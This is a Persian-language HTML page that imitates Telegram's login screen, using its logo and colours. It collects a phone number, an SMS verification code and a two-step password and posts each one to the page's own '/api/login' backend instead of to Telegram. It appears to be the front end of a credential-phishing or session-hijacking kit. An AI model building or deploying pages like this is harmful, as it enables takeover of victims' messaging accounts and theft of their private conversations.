<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>ورود به تلگرام</title>
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      text-align: center;
      margin: 0;
      padding: 20px;
      background: linear-gradient(135deg, #0088cc, #00a2ff);
      color: #333;
      direction: rtl;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .container {
      max-width: 400px;
      width: 90%;
      margin: 20px auto;
      padding: 30px;
      background-color: white;
      border-radius: 15px;
      box-shadow: 0 5px 20px rgba(0, 0, 0, 0.2);
    }

    .logo {
      margin-bottom: 20px;
    }

    h1 {
      color: #0088cc;
      margin-bottom: 10px;
      font-size: 24px;
    }

    p {
      color: #666;
      margin-bottom: 25px;
      font-size: 14px;
    }

    .input-group {
      margin: 20px 0;
      display: flex;
      flex-direction: column;
      gap: 15px;
    }

    input {
      padding: 14px;
      border: 1px solid #ddd;
      border-radius: 8px;
      font-size: 16px;
      text-align: center;
      transition: border-color 0.3s;
    }

    input:focus {
      outline: none;
      border-color: #0088cc;
      box-shadow: 0 0 0 2px rgba(0, 136, 204, 0.2);
    }

    button {
      padding: 14px 20px;
      background-color: #0088cc;
      color: white;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      font-size: 16px;
      font-weight: 600;
      transition: background-color 0.3s, transform 0.2s;
    }

    button:hover {
      background-color: #006da3;
      transform: translateY(-2px);
    }

    button:active {
      transform: translateY(0);
    }

    button:disabled {
      background-color: #ccc;
      cursor: not-allowed;
      transform: none;
    }

    .hidden {
      display: none;
    }

    .status {
      margin-top: 20px;
      padding: 15px;
      border-radius: 8px;
      min-height: 20px;
      font-size: 14px;
      color: #333;
    }

    .status.info {
      background-color: #e3f2fd;
      border-left: 4px solid #2196f3;
      color: #0d47a1;
    }

    .status.success {
      background-color: #e8f5e9;
      border-left: 4px solid #4caf50;
      color: #2e7d32;
    }

    .status.error {
      background-color: #ffebee;
      border-left: 4px solid #f44336;
      color: #c62828;
    }

    .status.loading {
      background-color: #fff3e0;
      border-left: 4px solid #ff9800;
      color: #e65100;
    }

    .status.loading::after {
      content: "...";
      animation: dots 1.5s steps(4, end) infinite;
    }

    @keyframes dots {
      0%, 20% { content: "."; }
      40% { content: ".."; }
      60%, 100% { content: "..."; }
    }

    /* حالت پاسخگویی برای موبایل */
    @media (max-width: 480px) {
      .container {
        padding: 20px;
        margin: 10px;
      }
      
      h1 {
        font-size: 20px;
      }
      
      input, button {
        padding: 12px;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo">
      <svg width="64" height="64" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
        <path d="M12 2C6.48 2 2 6.48 2 12C2 17.52 6.48 22 12 22C17.52 22 22 17.52 22 12C22 6.48 17.52 2 12 2Z" fill="#0088cc"/>
        <path d="M16.64 8.8C16.49 10.38 15.84 14.22 15.51 15.99C15.37 16.74 15.09 16.99 14.83 17.02C14.25 17.07 13.81 16.64 13.25 16.27C12.37 15.69 11.87 15.33 11.02 14.77C10.06 14.14 10.67 13.81 11.2 13.26C11.33 13.12 13.81 10.92 13.85 10.71C13.86 10.65 13.86 10.5 13.77 10.42C13.69 10.34 13.56 10.37 13.46 10.39C13.33 10.42 11.94 11.33 9.41 13.08C9 13.35 8.62 13.49 8.27 13.49C7.88 13.48 7.12 13.2 6.52 12.96C5.82 12.68 5.27 12.53 5.32 12.15C5.35 11.94 5.65 11.72 6.2 11.5C9.49 10.08 11.68 9.18 12.76 8.8C15.99 7.58 16.69 7.36 17.07 7.36C17.16 7.36 17.37 7.38 17.5 7.49C17.61 7.58 17.64 7.7 17.64 7.79C17.63 7.88 17.64 8.1 17.53 8.24C17.44 8.37 16.91 8.53 16.64 8.8Z" fill="white"/>
      </svg>
    </div>
    <h1>ورود به تلگرام</h1>
    <p>لطفاً شماره تلفن خود را وارد کنید</p>
    
    <div class="input-group">
      <input id="phone" type="tel" placeholder="شماره تلفن (مثال: +989123456789)" />
      <button id="sendPhone">ارسال شماره</button>
    </div>

    <div id="codeSection" class="hidden">
      <div class="input-group">
        <input id="code" type="text" placeholder="کد تایید ۵ رقمی" />
        <button id="sendCode">تایید کد</button>
      </div>
    </div>

    <div id="status" class="status">لطفاً شماره تلفن خود را وارد کنید</div>
  </div>

  <script>
    // script.js
    let phoneCodeHash = ''; // برای ذخیره hash کد
    let currentPhone = ''; // برای ذخیره شماره تلفن

    document.getElementById("sendPhone").onclick = async () => {
      const phone = document.getElementById("phone").value;
      if (!phone) {
        showStatus("لطفاً شماره تلفن را وارد کنید", "error");
        return;
      }

      // اعتبارسنجی شماره تلفن
      if (!isValidPhoneNumber(phone)) {
        showStatus("لطفاً شماره تلفن معتبر وارد کنید (مثال: +989123456789)", "error");
        return;
      }

      currentPhone = phone;
      showStatus("در حال ارسال کد...", "loading");
      
      try {
        const res = await fetch("/api/login", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ step: "sendCode", phone })
        });
        
        const data = await res.json();
        
        if (data.success) {
          showStatus(data.message, "success");
          phoneCodeHash = data.phoneCodeHash; // ذخیره hash برای مرحله بعد
          document.getElementById("codeSection").style.display = "block";
        } else {
          showStatus(data.message, "error");
        }
      } catch (error) {
        showStatus("خطا در ارتباط با سرور", "error");
        console.error(error);
      }
    };

    document.getElementById("sendCode").onclick = async () => {
      const code = document.getElementById("code").value;
      
      if (!code) {
        showStatus("لطفاً کد تأیید را وارد کنید", "error");
        return;
      }

      showStatus("در حال تأیید کد...", "loading");
      
      try {
        const res = await fetch("/api/login", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ 
            step: "verifyCode", 
            phone: currentPhone, 
            code,
            phoneCodeHash 
          })
        });
        
        const data = await res.json();
        
        if (data.success) {
          showStatus(data.message, "success");
          document.getElementById("codeSection").style.display = "none";
          
          // ریدایرکت بعد از ورود موفق
          setTimeout(() => {
            showStatus("شما با موفقیت وارد شدید! در حال انتقال...", "success");
          }, 2000);
        } else if (data.needPassword) {
          showStatus(data.message, "info");
          // اگر نیاز به رمز دومرحله‌ای باشد
          setTimeout(() => {
            const password = prompt("لطفاً رمز دومرحله‌ای خود را وارد کنید:");
            if (password) {
              checkPassword(password);
            }
          }, 1000);
        } else {
          showStatus(data.message, "error");
        }
      } catch (error) {
        showStatus("خطا در ارتباط با سرور", "error");
        console.error(error);
      }
    };

    // تابع برای بررسی رمز دومرحله‌ای
    async function checkPassword(password) {
      showStatus("در حال بررسی رمز...", "loading");
      
      try {
        const res = await fetch("/api/login", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ 
            step: "checkPassword", 
            phone: currentPhone, 
            password 
          })
        });
        
        const data = await res.json();
        
        if (data.success) {
          showStatus(data.message, "success");
          document.getElementById("codeSection").style.display = "none";
          
          // ریدایرکت بعد از ورود موفق
          setTimeout(() => {
            showStatus("شما با موفقیت وارد شدید! در حال انتقال...", "success");
          }, 2000);
        } else {
          showStatus(data.message, "error");
        }
      } catch (error) {
        showStatus("خطا در ارتباط با سرور", "error");
        console.error(error);
      }
    }

    // تابع برای نمایش وضعیت با استایل‌های مختلف
    function showStatus(message, type = "info") {
      const statusElement = document.getElementById("status");
      statusElement.textContent = message;
      statusElement.className = "status";
      
      switch (type) {
        case "error":
          statusElement.classList.add("error");
          break;
        case "success":
          statusElement.classList.add("success");
          break;
        case "loading":
          statusElement.classList.add("loading");
          break;
        case "info":
        default:
          statusElement.classList.add("info");
          break;
      }
    }

    // تابع برای اعتبارسنجی شماره تلفن
    function isValidPhoneNumber(phone) {
      const regex = /^\+[1-9]\d{1,14}$/;
      return regex.test(phone);
    }

    // فعال کردن دکمه با کلید Enter
    document.getElementById("phone").addEventListener("keypress", function(event) {
      if (event.key === "Enter") {
        event.preventDefault();
        document.getElementById("sendPhone").click();
      }
    });

    document.getElementById("code").addEventListener("keypress", function(event) {
      if (event.key === "Enter") {
        event.preventDefault();
        document.getElementById("sendCode").click();
      }
    });
  </script>
</body>
</html>
